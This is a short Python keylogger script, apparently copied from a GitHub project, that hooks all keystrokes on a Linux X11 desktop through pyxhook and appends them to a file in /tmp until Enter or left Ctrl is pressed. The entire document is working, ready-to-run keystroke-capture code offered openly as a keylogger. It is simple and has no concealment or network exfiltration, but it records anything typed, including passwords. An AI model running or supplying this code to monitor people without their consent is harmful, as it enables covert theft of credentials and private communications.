"""
Taken from https://github.com/hiamandeep/py-keylogger

The program terminates when ENTER or L_CTRL is pressed
"""

import pyxhook

# change this to your log file's path
log_file = '/tmp/keys.log'


# this function is called everytime a key is pressed.
def OnKeyPress(event):
    fob = open(log_file, 'a')
    if event.Key == 'Return' or event.Key == 'Control_L':
        fob.close()
        new_hook.cancel()
        quit()
    if event.Key == 'Tab':
        fob.write(event.Key)
    else:
        fob.write(chr(event.Ascii))


# instantiate HookManager class
new_hook = pyxhook.HookManager()
# listen to all keystrokes
new_hook.KeyDown = OnKeyPress
# hook the keyboard
new_hook.HookKeyboard()
# start the session
new_hook.start()
